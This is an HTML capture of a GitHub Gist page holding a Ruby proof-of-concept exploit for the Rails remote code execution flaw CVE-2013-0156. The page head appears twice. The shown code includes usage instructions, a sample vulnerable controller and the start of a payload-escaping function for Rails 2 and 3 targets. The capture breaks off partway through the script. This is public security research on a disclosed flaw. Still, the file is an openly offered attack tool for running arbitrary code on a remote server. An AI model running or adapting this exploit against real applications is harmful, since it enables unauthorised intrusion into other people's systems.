@@ -1,0 +1,2772 @@
+
+<!DOCTYPE html>
+<html>
+<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# githubog: http://ogp.me/ns/fb/githubog#">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+  <title>Proof-of-Concept exploit for Rails Remote Code Execution (CVE-2013-0156)</title>
+
+  <meta content="authenticity_token" name="csrf-param" />
+<meta content="O/3kfhayIVeRDs0rV1MQCTbKxmD8kJ43doCmG0Ev+zY=" name="csrf-token" />
+  <meta name="viewport" content="width=960">
+
+<!DOCTYPE html>
+<html>
+<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# githubog: http://ogp.me/ns/fb/githubog#">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+  <title>Proof-of-Concept exploit for Rails Remote Code Execution (CVE-2013-0156)</title>
+
+  <meta content="authenticity_token" name="csrf-param" />
+<meta content="O/3kfhayIVeRDs0rV1MQCTbKxmD8kJ43doCmG0Ev+zY=" name="csrf-token" />
+  <meta name="viewport" content="width=960">
+
+
+  <link href="https://gist.github.com/assets/application-ca1a6454c0d217b1529b724a95888ade.css" media="screen, print" rel="stylesheet" />
+  <script src="https://gist.github.com/assets/application-7151a8ac790418fd5a6f5530eeea3234.js"></script>
+
+    <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@github">
+  <meta name="twitter:creator" content="@postmodern">
+  <meta property="og:title" content="rails_rce.rb">
+  <meta property="og:type" content="githubog:gist">
+  <meta property="og:url" content="https://gist.github.com/4499206">
+  <meta property="og:image" content="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <meta property="og:site_name" content="GitHub Gists">
+  <meta property="og:description" content="Proof-of-Concept exploit for Rails Remote Code Execution (CVE-2013-0156)">
+
+  <meta name="description" content="Proof-of-Concept exploit for Rails Remote Code Execution (CVE-2013-0156)">
+
+</head>
+
+<body class="logged_in">
+
+  <div id="wrapper">
+
+
+    <div id="header" class="header header-logged-in">
+      <div class="container clearfix">
+        <a class="header-logo-blacktocat" href="https://gist.github.com/">
+          <span class="mega-icon mega-icon-blacktocat"></span>
+          <span class="logo-subbrand"><img alt="GitHub:Gist" height="25" src="https://gist.github.com/assets/modules/header/logo-logged-in@4x-6a0620a1bd429fde8a2dd01fb4baef26.png"></span>
+        </a>
+        <div class="divider-vertical"></div>
+        <div class="topsearch">
+  <form id="top_search_form" action="/search" data-pjax-remote=push accept-charset="UTF-8">
+    <div class="search">
+      <input type="text" class="search js-search js-navigation-enable" name="q" placeholder="Search&#x2026;" data-hotkey="/" autocomplete=off autocorrect=off value="" >
+
+      <div class="search-results js-search-results js-navigation-container"></div>
+    </div>
+    <div class="divider-vertical"></div>
+  </form>
+  <ul class="top-nav">
+    <li class="explore"><a href="/discover/">Discover Gists</a></li>
+  </ul>
+</div>
+
+        <ul id="user-links">
+  <li>
+    <a href="/andrewconner" class="name">
+      <img src="https://secure.gravatar.com/avatar/2d294fa145fd71d028923b2615334715?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png" width="20" height="20"> andrewconner
+    </a>
+  </li>
+  <li>
+    <a href="/" id="new_gist" class="tooltipped downwards" title="Create a New Gist">
+      <span class="mini-icon mini-icon-gist-add"></span>
+    </a>
+  </li>
+  <li>
+    <a href="https://github.com" class="tooltipped downwards" title="Go to GitHub">
+      <span class="mini-icon mini-icon-octocat"></span>
+    </a>
+  </li>
+  <li>
+    <a href="https://github.com/logout" class="tooltipped downwards" id="logout" title="Log Out">
+      <span class="mini-icon mini-icon-logout"></span>
+    </a>
+  </li>
+</ul>
+
+      </div>
+    </div>
+
+    <div class="site-content" id="js-pjax-container" data-pjax-container>
+      <div class=" site-container js-site-container" data-url="/4499206">
+  <div class="pagehead repohead">
+  <div class="container">
+    <div class="title-actions-bar">
+      <ul class="pagehead-actions">
+
+        <li>
+          <li>
+              <form action="/4499206/star" data-pjax-remote=replace method="post" accept-charset="UTF-8">
+                <input name="authenticity_token" type="hidden" value="O/3kfhayIVeRDs0rV1MQCTbKxmD8kJ43doCmG0Ev+zY=" />
+                <button class="minibutton" type="submit"><span class="mini-icon mini-icon-star"></span>Star</button>
+                <a class="social-count js-social-count" href="/4499206/stars">32</a>
+              </form>
+          </li>
+          <li>
+              <form action="/4499206/fork" data-method="post" method="post" accept-charset="UTF-8">
+                <button class="minibutton fork-button" type="submit"><span class="mini-icon mini-icon-fork"></span>Fork</button>
+                <a class="social-count js-social-count" href="/4499206/forks">20</a>
+              </form>
+          </li>
+      </ul>
+      <h1 itemscope itemtype="http://data-vocabulary.org/Breadcrumb" class="entry-title public">
+        <span class="repo-label"><span>public</span></span>
+        <span class="mega-icon mega-icon-gist" ></span>
+        <div class="meta">
+          <div class="gist-author">
+            <img src="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png" width="26" height="26">
+            <span class="author vcard">
+                <span itemprop="title"><a href="/postmodern">postmodern</a></span>
+            </span> /
+            <strong><a href="/4499206" class="js-current-repository">rails_rce.rb</a></strong>
+          </div>
+          <div class="gist-timestamp">
+              <span class="datetime">Last updated <time class="js-relative-date" title="2013-01-13T06:10:22Z" datetime="2013-01-13T06:10:22Z">2013-01-13</time></span>
+          </div>
+      </h1>
+    </div>
+
+  </div>
+</div>
+
+
+
+<div class="gist-description container">
+  <p>Proof-of-Concept exploit for Rails Remote Code Execution (CVE-2013-0156)</p>
+</div>
+
+<div class="gist container">
+    <div class="root-pane">
+  <div class="menu-container">
+    <ul class="menu gisttabs">
+      <li>
+        <a href="/4499206" class="selected">
+          Gist Detail
+        </a>
+      </li>
+
+        <li>
+          <a href="/4499206/revisions" >
+            Revisions
+            <span class="counter">11</span>
+          </a>
+        </li>
+
+        <li>
+          <a href="/4499206/stars" >
+            Stars
+            <span class="counter">32</span>
+          </a>
+        </li>
+
+        <li>
+          <a href="/4499206/forks" >
+            Forks
+            <span class="counter">20</span>
+          </a>
+        </li>
+    </ul>
+  </div>
+
+  <ul class="export-references">
+    <li>
+      <a href="/4499206/download" class="minibutton" rel="nofollow"><span class="mini-icon mini-icon-download"></span>Download Gist</a>
+    </li>
+    <li>
+      <label for="url-field"><strong>Clone</strong> this gist</label>
+      <input type="text" spellcheck="false" class="url-field js-url-field" name="url-field" value="https://gist.github.com/4499206.git">
+    </li>
+    <li>
+      <label for="embed-field"><strong>Embed</strong> this gist</label>
+      <input type="text" spellcheck="false" class="url-field js-url-field" name="embed-field" value="&lt;script src=&quot;https://gist.github.com/4499206.js&quot;&gt;&lt;/script&gt;">
+    </li>
+    <li>
+      <label for="link-field"><strong>Link to</strong> this gist</label>
+      <input type="text" spellcheck="false" class="url-field js-url-field" name="link-field" value="https://gist.github.com/4499206">
+    </li>
+  </ul>
+</div>
+
+
+  <div class="column files">
+        <div id="file-rails_rce-rb" class="bubble">
+          <div class="file-box ">
+            <div class="meta">
+              <div class="info">
+                <span class="icon mini-icon "></span>
+                <strong class="name">rails_rce.rb</strong>
+                <span class="language">Ruby</span>
+                <span class="size">3.56 KB</span>
+              </div>
+              <ul class="button-group actions">
+                <li><a title="Bookmark" href="#file-rails_rce-rb" class="grouped-button minibutton tooltipped downwards bookmark"><span class="mini-icon mini-icon-link"></span></a></li>
+                <li><a title="View Raw" href="/raw/4499206/1575266e471729ea8a9231ae359dd5772a6ece9c/rails_rce.rb" data-skip-pjax class="grouped-button minibutton tooltipped downwards raw-url"><span class="mini-icon mini-icon-code"></span></a></li>
+              </ul>
+            </div>
+            <div class="suppressed">
+              <a class="js-show-suppressed-file">File suppressed. Click to show.</a>
+            </div>
+
+
+
+  <div class="data">
+    <table cellpadding="0" cellspacing="0" class="lines highlight">
+      <tr>
+        <td class="line_numbers">
+          <span id="file-rails_rce-rb-L1" rel="file-rails_rce-rb-L1">1</span>
+          <span id="file-rails_rce-rb-L2" rel="file-rails_rce-rb-L2">2</span>
+          <span id="file-rails_rce-rb-L3" rel="file-rails_rce-rb-L3">3</span>
+          <span id="file-rails_rce-rb-L4" rel="file-rails_rce-rb-L4">4</span>
+          <span id="file-rails_rce-rb-L5" rel="file-rails_rce-rb-L5">5</span>
+          <span id="file-rails_rce-rb-L6" rel="file-rails_rce-rb-L6">6</span>
+          <span id="file-rails_rce-rb-L7" rel="file-rails_rce-rb-L7">7</span>
+          <span id="file-rails_rce-rb-L8" rel="file-rails_rce-rb-L8">8</span>
+          <span id="file-rails_rce-rb-L9" rel="file-rails_rce-rb-L9">9</span>
+          <span id="file-rails_rce-rb-L10" rel="file-rails_rce-rb-L10">10</span>
+          <span id="file-rails_rce-rb-L11" rel="file-rails_rce-rb-L11">11</span>
+          <span id="file-rails_rce-rb-L12" rel="file-rails_rce-rb-L12">12</span>
+          <span id="file-rails_rce-rb-L13" rel="file-rails_rce-rb-L13">13</span>
+          <span id="file-rails_rce-rb-L14" rel="file-rails_rce-rb-L14">14</span>
+          <span id="file-rails_rce-rb-L15" rel="file-rails_rce-rb-L15">15</span>
+          <span id="file-rails_rce-rb-L16" rel="file-rails_rce-rb-L16">16</span>
+          <span id="file-rails_rce-rb-L17" rel="file-rails_rce-rb-L17">17</span>
+          <span id="file-rails_rce-rb-L18" rel="file-rails_rce-rb-L18">18</span>
+          <span id="file-rails_rce-rb-L19" rel="file-rails_rce-rb-L19">19</span>
+          <span id="file-rails_rce-rb-L20" rel="file-rails_rce-rb-L20">20</span>
+          <span id="file-rails_rce-rb-L21" rel="file-rails_rce-rb-L21">21</span>
+          <span id="file-rails_rce-rb-L22" rel="file-rails_rce-rb-L22">22</span>
+          <span id="file-rails_rce-rb-L23" rel="file-rails_rce-rb-L23">23</span>
+          <span id="file-rails_rce-rb-L24" rel="file-rails_rce-rb-L24">24</span>
+          <span id="file-rails_rce-rb-L25" rel="file-rails_rce-rb-L25">25</span>
+          <span id="file-rails_rce-rb-L26" rel="file-rails_rce-rb-L26">26</span>
+          <span id="file-rails_rce-rb-L27" rel="file-rails_rce-rb-L27">27</span>
+          <span id="file-rails_rce-rb-L28" rel="file-rails_rce-rb-L28">28</span>
+          <span id="file-rails_rce-rb-L29" rel="file-rails_rce-rb-L29">29</span>
+          <span id="file-rails_rce-rb-L30" rel="file-rails_rce-rb-L30">30</span>
+          <span id="file-rails_rce-rb-L31" rel="file-rails_rce-rb-L31">31</span>
+          <span id="file-rails_rce-rb-L32" rel="file-rails_rce-rb-L32">32</span>
+          <span id="file-rails_rce-rb-L33" rel="file-rails_rce-rb-L33">33</span>
+          <span id="file-rails_rce-rb-L34" rel="file-rails_rce-rb-L34">34</span>
+          <span id="file-rails_rce-rb-L35" rel="file-rails_rce-rb-L35">35</span>
+          <span id="file-rails_rce-rb-L36" rel="file-rails_rce-rb-L36">36</span>
+          <span id="file-rails_rce-rb-L37" rel="file-rails_rce-rb-L37">37</span>
+          <span id="file-rails_rce-rb-L38" rel="file-rails_rce-rb-L38">38</span>
+          <span id="file-rails_rce-rb-L39" rel="file-rails_rce-rb-L39">39</span>
+          <span id="file-rails_rce-rb-L40" rel="file-rails_rce-rb-L40">40</span>
+          <span id="file-rails_rce-rb-L41" rel="file-rails_rce-rb-L41">41</span>
+          <span id="file-rails_rce-rb-L42" rel="file-rails_rce-rb-L42">42</span>
+          <span id="file-rails_rce-rb-L43" rel="file-rails_rce-rb-L43">43</span>
+          <span id="file-rails_rce-rb-L44" rel="file-rails_rce-rb-L44">44</span>
+          <span id="file-rails_rce-rb-L45" rel="file-rails_rce-rb-L45">45</span>
+          <span id="file-rails_rce-rb-L46" rel="file-rails_rce-rb-L46">46</span>
+          <span id="file-rails_rce-rb-L47" rel="file-rails_rce-rb-L47">47</span>
+          <span id="file-rails_rce-rb-L48" rel="file-rails_rce-rb-L48">48</span>
+          <span id="file-rails_rce-rb-L49" rel="file-rails_rce-rb-L49">49</span>
+          <span id="file-rails_rce-rb-L50" rel="file-rails_rce-rb-L50">50</span>
+          <span id="file-rails_rce-rb-L51" rel="file-rails_rce-rb-L51">51</span>
+          <span id="file-rails_rce-rb-L52" rel="file-rails_rce-rb-L52">52</span>
+          <span id="file-rails_rce-rb-L53" rel="file-rails_rce-rb-L53">53</span>
+          <span id="file-rails_rce-rb-L54" rel="file-rails_rce-rb-L54">54</span>
+          <span id="file-rails_rce-rb-L55" rel="file-rails_rce-rb-L55">55</span>
+          <span id="file-rails_rce-rb-L56" rel="file-rails_rce-rb-L56">56</span>
+          <span id="file-rails_rce-rb-L57" rel="file-rails_rce-rb-L57">57</span>
+          <span id="file-rails_rce-rb-L58" rel="file-rails_rce-rb-L58">58</span>
+          <span id="file-rails_rce-rb-L59" rel="file-rails_rce-rb-L59">59</span>
+          <span id="file-rails_rce-rb-L60" rel="file-rails_rce-rb-L60">60</span>
+          <span id="file-rails_rce-rb-L61" rel="file-rails_rce-rb-L61">61</span>
+          <span id="file-rails_rce-rb-L62" rel="file-rails_rce-rb-L62">62</span>
+          <span id="file-rails_rce-rb-L63" rel="file-rails_rce-rb-L63">63</span>
+          <span id="file-rails_rce-rb-L64" rel="file-rails_rce-rb-L64">64</span>
+          <span id="file-rails_rce-rb-L65" rel="file-rails_rce-rb-L65">65</span>
+          <span id="file-rails_rce-rb-L66" rel="file-rails_rce-rb-L66">66</span>
+          <span id="file-rails_rce-rb-L67" rel="file-rails_rce-rb-L67">67</span>
+          <span id="file-rails_rce-rb-L68" rel="file-rails_rce-rb-L68">68</span>
+          <span id="file-rails_rce-rb-L69" rel="file-rails_rce-rb-L69">69</span>
+          <span id="file-rails_rce-rb-L70" rel="file-rails_rce-rb-L70">70</span>
+          <span id="file-rails_rce-rb-L71" rel="file-rails_rce-rb-L71">71</span>
+          <span id="file-rails_rce-rb-L72" rel="file-rails_rce-rb-L72">72</span>
+          <span id="file-rails_rce-rb-L73" rel="file-rails_rce-rb-L73">73</span>
+          <span id="file-rails_rce-rb-L74" rel="file-rails_rce-rb-L74">74</span>
+          <span id="file-rails_rce-rb-L75" rel="file-rails_rce-rb-L75">75</span>
+          <span id="file-rails_rce-rb-L76" rel="file-rails_rce-rb-L76">76</span>
+          <span id="file-rails_rce-rb-L77" rel="file-rails_rce-rb-L77">77</span>
+          <span id="file-rails_rce-rb-L78" rel="file-rails_rce-rb-L78">78</span>
+          <span id="file-rails_rce-rb-L79" rel="file-rails_rce-rb-L79">79</span>
+          <span id="file-rails_rce-rb-L80" rel="file-rails_rce-rb-L80">80</span>
+          <span id="file-rails_rce-rb-L81" rel="file-rails_rce-rb-L81">81</span>
+          <span id="file-rails_rce-rb-L82" rel="file-rails_rce-rb-L82">82</span>
+          <span id="file-rails_rce-rb-L83" rel="file-rails_rce-rb-L83">83</span>
+          <span id="file-rails_rce-rb-L84" rel="file-rails_rce-rb-L84">84</span>
+          <span id="file-rails_rce-rb-L85" rel="file-rails_rce-rb-L85">85</span>
+          <span id="file-rails_rce-rb-L86" rel="file-rails_rce-rb-L86">86</span>
+          <span id="file-rails_rce-rb-L87" rel="file-rails_rce-rb-L87">87</span>
+          <span id="file-rails_rce-rb-L88" rel="file-rails_rce-rb-L88">88</span>
+          <span id="file-rails_rce-rb-L89" rel="file-rails_rce-rb-L89">89</span>
+          <span id="file-rails_rce-rb-L90" rel="file-rails_rce-rb-L90">90</span>
+          <span id="file-rails_rce-rb-L91" rel="file-rails_rce-rb-L91">91</span>
+          <span id="file-rails_rce-rb-L92" rel="file-rails_rce-rb-L92">92</span>
+          <span id="file-rails_rce-rb-L93" rel="file-rails_rce-rb-L93">93</span>
+          <span id="file-rails_rce-rb-L94" rel="file-rails_rce-rb-L94">94</span>
+          <span id="file-rails_rce-rb-L95" rel="file-rails_rce-rb-L95">95</span>
+          <span id="file-rails_rce-rb-L96" rel="file-rails_rce-rb-L96">96</span>
+          <span id="file-rails_rce-rb-L97" rel="file-rails_rce-rb-L97">97</span>
+          <span id="file-rails_rce-rb-L98" rel="file-rails_rce-rb-L98">98</span>
+          <span id="file-rails_rce-rb-L99" rel="file-rails_rce-rb-L99">99</span>
+          <span id="file-rails_rce-rb-L100" rel="file-rails_rce-rb-L100">100</span>
+          <span id="file-rails_rce-rb-L101" rel="file-rails_rce-rb-L101">101</span>
+          <span id="file-rails_rce-rb-L102" rel="file-rails_rce-rb-L102">102</span>
+          <span id="file-rails_rce-rb-L103" rel="file-rails_rce-rb-L103">103</span>
+          <span id="file-rails_rce-rb-L104" rel="file-rails_rce-rb-L104">104</span>
+          <span id="file-rails_rce-rb-L105" rel="file-rails_rce-rb-L105">105</span>
+          <span id="file-rails_rce-rb-L106" rel="file-rails_rce-rb-L106">106</span>
+          <span id="file-rails_rce-rb-L107" rel="file-rails_rce-rb-L107">107</span>
+          <span id="file-rails_rce-rb-L108" rel="file-rails_rce-rb-L108">108</span>
+          <span id="file-rails_rce-rb-L109" rel="file-rails_rce-rb-L109">109</span>
+          <span id="file-rails_rce-rb-L110" rel="file-rails_rce-rb-L110">110</span>
+          <span id="file-rails_rce-rb-L111" rel="file-rails_rce-rb-L111">111</span>
+          <span id="file-rails_rce-rb-L112" rel="file-rails_rce-rb-L112">112</span>
+          <span id="file-rails_rce-rb-L113" rel="file-rails_rce-rb-L113">113</span>
+          <span id="file-rails_rce-rb-L114" rel="file-rails_rce-rb-L114">114</span>
+          <span id="file-rails_rce-rb-L115" rel="file-rails_rce-rb-L115">115</span>
+          <span id="file-rails_rce-rb-L116" rel="file-rails_rce-rb-L116">116</span>
+          <span id="file-rails_rce-rb-L117" rel="file-rails_rce-rb-L117">117</span>
+          <span id="file-rails_rce-rb-L118" rel="file-rails_rce-rb-L118">118</span>
+          <span id="file-rails_rce-rb-L119" rel="file-rails_rce-rb-L119">119</span>
+          <span id="file-rails_rce-rb-L120" rel="file-rails_rce-rb-L120">120</span>
+          <span id="file-rails_rce-rb-L121" rel="file-rails_rce-rb-L121">121</span>
+          <span id="file-rails_rce-rb-L122" rel="file-rails_rce-rb-L122">122</span>
+          <span id="file-rails_rce-rb-L123" rel="file-rails_rce-rb-L123">123</span>
+          <span id="file-rails_rce-rb-L124" rel="file-rails_rce-rb-L124">124</span>
+          <span id="file-rails_rce-rb-L125" rel="file-rails_rce-rb-L125">125</span>
+          <span id="file-rails_rce-rb-L126" rel="file-rails_rce-rb-L126">126</span>
+          <span id="file-rails_rce-rb-L127" rel="file-rails_rce-rb-L127">127</span>
+          <span id="file-rails_rce-rb-L128" rel="file-rails_rce-rb-L128">128</span>
+          <span id="file-rails_rce-rb-L129" rel="file-rails_rce-rb-L129">129</span>
+          <span id="file-rails_rce-rb-L130" rel="file-rails_rce-rb-L130">130</span>
+          <span id="file-rails_rce-rb-L131" rel="file-rails_rce-rb-L131">131</span>
+          <span id="file-rails_rce-rb-L132" rel="file-rails_rce-rb-L132">132</span>
+          <span id="file-rails_rce-rb-L133" rel="file-rails_rce-rb-L133">133</span>
+          <span id="file-rails_rce-rb-L134" rel="file-rails_rce-rb-L134">134</span>
+          <span id="file-rails_rce-rb-L135" rel="file-rails_rce-rb-L135">135</span>
+          <span id="file-rails_rce-rb-L136" rel="file-rails_rce-rb-L136">136</span>
+          <span id="file-rails_rce-rb-L137" rel="file-rails_rce-rb-L137">137</span>
+          <span id="file-rails_rce-rb-L138" rel="file-rails_rce-rb-L138">138</span>
+          <span id="file-rails_rce-rb-L139" rel="file-rails_rce-rb-L139">139</span>
+          <span id="file-rails_rce-rb-L140" rel="file-rails_rce-rb-L140">140</span>
+          <span id="file-rails_rce-rb-L141" rel="file-rails_rce-rb-L141">141</span>
+          <span id="file-rails_rce-rb-L142" rel="file-rails_rce-rb-L142">142</span>
+        </td>
+        <td class="line_data" width="100%">
+          <pre><div class="line" id="file-rails_rce-rb-LC1"><span class="c1">#!/usr/bin/env ruby</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC2"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC3"><span class="c1"># Proof-of-Concept exploit for Rails Remote Code Execution (CVE-2013-0156)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC4"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC5"><span class="c1"># ## Advisory</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC6"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC7"><span class="c1">#   https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC8"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC9"><span class="c1"># ## Caveats</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC10"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC11"><span class="c1"># * Does not support Ruby 1.8.7.</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC12"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC13"><span class="c1"># ## Synopsis</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC14"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC15"><span class="c1">#   $ rails_rce.rb URL RUBY</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC16"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC17"><span class="c1"># ## Dependencies</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC18"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC19"><span class="c1">#   $ gem install ronin-support</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC20"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC21"><span class="c1"># ## Example</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC22"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC23"><span class="c1">#   $ rails_rce.rb http://localhost:3000/secrets/search &quot;puts &#39;lol&#39;&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC24"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC25"><span class="c1"># ### config/routes.rb</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC26"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC27"><span class="c1">#   resources :secrets do</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC28"><span class="c1">#     collection do</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC29"><span class="c1">#       post :search</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC30"><span class="c1">#     end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC31"><span class="c1">#   end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC32"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC33"><span class="c1"># ### app/controllers/secrets_controller.rb</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC34"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC35"><span class="c1">#   def search</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC36"><span class="c1">#     @secret = secret.find_by_secret(params[:secret])</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC37"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC38"><span class="c1">#     render :json =&gt; @secret</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC39"><span class="c1">#   end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC40"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC41"><span class="c1"># ## License</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC42"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC43"><span class="c1"># Copyright (c) 2013 Postmodern</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC44"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC45"><span class="c1"># This exploit is free software: you can redistribute it and/or modify</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC46"><span class="c1"># it under the terms of the GNU General Public License as published by</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC47"><span class="c1"># the Free Software Foundation, either version 3 of the License, or</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC48"><span class="c1"># (at your option) any later version.</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC49"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC50"><span class="c1"># This exploit is distributed in the hope that it will be useful,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC51"><span class="c1"># but WITHOUT ANY WARRANTY; without even the implied warranty of</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC52"><span class="c1"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC53"><span class="c1"># GNU General Public License for more details.</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC54"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC55"><span class="c1"># You should have received a copy of the GNU General Public License</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC56"><span class="c1"># along with this exploit.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC57"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC58"><span class="c1"># ## Shoutz</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC59"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC60"><span class="c1"># drraid, cd, px, sanitybit, sysfail, trent, dbcooper, goldy, coderman, letch,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC61"><span class="c1"># starik, toby, jlt, HockeyInJune, cloud, zek, natron, amesc, postmodern,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC62"><span class="c1"># mephux, nullthreat, evoltech, flatline, r0bglesson, @ericmonti, @bascule,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC63"><span class="c1"># @charliesome, @homakov, @envygeek, @chendo, @bitsweat (for creating the vuln),</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC64"><span class="c1"># @tenderlove (for fixing it), Fun Town Auto, garbage pail kids, hipsters,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC65"><span class="c1"># the old Jolly Inn, Irvin Santiago, that heavy metal dude who always bummed</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC66"><span class="c1"># cigarettes off us, SophSec crew and affiliates.</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC67"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC68">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC69"><span class="nb">require</span> <span class="s1">&#39;ronin/network/http&#39;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC70"><span class="nb">require</span> <span class="s1">&#39;ronin/formatting/html&#39;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC71"><span class="nb">require</span> <span class="s1">&#39;ronin/ui/output&#39;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC72"><span class="nb">require</span> <span class="s1">&#39;yaml&#39;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC73">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC74"><span class="kp">include</span> <span class="ss">Ronin</span><span class="p">:</span><span class="ss">:Network</span><span class="o">::</span><span class="no">HTTP</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC75"><span class="kp">include</span> <span class="ss">Ronin</span><span class="p">:</span><span class="ss">:UI</span><span class="o">::</span><span class="ss">Output</span><span class="p">:</span><span class="ss">:Helpers</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC76">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC77"><span class="k">def</span> <span class="nf">escape_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">target</span><span class="o">=</span><span class="ss">:rails3</span><span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC78">  <span class="k">case</span> <span class="n">target</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC79">  <span class="k">when</span> <span class="ss">:rails3</span> <span class="k">then</span> <span class="s2">&quot;foo</span><span class="se">\n</span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="se">\n</span><span class="s2">__END__</span><span class="se">\n</span><span class="s2">&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC80">  <span class="k">when</span> <span class="ss">:rails2</span> <span class="k">then</span> <span class="s2">&quot;foo</span><span class="se">\n</span><span class="s2">end</span><span class="se">\n</span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="se">\n</span><span class="s2">__END__</span><span class="se">\n</span><span class="s2">&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC81">  <span class="k">else</span></div></pre>
